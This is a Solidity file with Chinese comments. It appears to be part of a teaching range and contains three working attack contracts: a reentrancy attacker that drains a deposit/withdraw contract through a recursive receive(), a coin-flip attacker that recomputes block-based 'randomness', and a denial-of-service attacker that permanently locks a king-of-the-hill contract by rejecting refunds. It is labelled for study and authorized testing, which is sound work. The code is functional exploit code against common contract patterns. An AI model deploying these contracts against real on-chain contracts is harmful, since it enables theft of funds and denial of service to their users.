// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * 攻击合约集合 —— 用于验证 targets/ 下教学靶场的漏洞可利用性。
 *
 * ⚠️ 仅用于安全学习与授权测试。
 */

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
}

/// @title 重入攻击
/// @notice 目标：先转账、后扣账的取款函数（PiggyBank / Savings / Staking 模式）
///
/// 攻击原理：
///   1. attack() 先存入启动资金，取得调用 withdraw() 的资格
///   2. withdraw() 在扣账之前把钱转给本合约 → 触发 receive()
///   3. receive() 中再次调用 withdraw()，此时账本上的余额还是旧值
///   4. 循环直到目标合约被掏空
///
/// receive() 里的余额判断是必须的：
///   如果无脑重复调用，最后一次会因为目标合约余额不足而转账失败，
///   导致 require(ok, "failed") 回滚，整笔攻击前功尽弃。
contract ReentrancyAttacker {
    IVictim public target;
    address public hacker;

    constructor(address _target) {
        target = IVictim(_target);
        hacker = msg.sender;
    }

    /// @param 启动资金（msg.value），必须大于 0 才能在目标合约里留下余额
    function attack() public payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    /// @dev 收到钱的那一刻自动执行
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function collect() public {
        payable(hacker).transfer(address(this).balance);
    }
}

interface ICoinFlip {
    function play(bool myGuess) external;
}

/// @title 随机数可预测
/// @notice 目标：用 block.prevrandao / block.timestamp 生成「随机数」的合约
///
/// 攻击原理：
///   同一笔交易内，block.timestamp 和 block.prevrandao 是固定不变的。
///   本合约用完全相同的公式算出 lucky，再把它当作猜测值传进去 ——
///   不是猜对，是看了答案再猜，成功率 100%（手动调用只有 50%）。
contract CoinFlipAttacker {
    ICoinFlip public game;

    constructor(address _game) {
        game = ICoinFlip(_game);
    }

    function attack() public {
        uint lucky = uint(keccak256(abi.encodePacked(block.prevrandao, block.timestamp))) % 2;
        game.play(lucky == 1);
    }

    function collect() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

interface IKingOfTheHill {
    function claim() external payable;
}

/// @title 拒绝服务（DoS）
/// @notice 目标：退款时使用 transfer 推送资金的合约
///
/// 攻击原理：
///   本合约故意不实现 receive() / fallback()，即「拒收一切转账」。
///   夺取王位后，目标合约在 claim() 里执行 payable(king).transfer(prize)
///   会失败，导致整个 claim 回滚 —— 王位被永久锁死，谁都抢不回来。
///
/// 修复方向：Pull over Push —— 把「推送」改成「记账 + 让他自己来取」。
contract DoSKingAttacker {
    IKingOfTheHill public game;

    constructor(address _game) {
        game = IKingOfTheHill(_game);
    }

    function attack() public payable {
        game.claim{value: msg.value}();
    }

    // 故意不写 receive() / fallback()
}
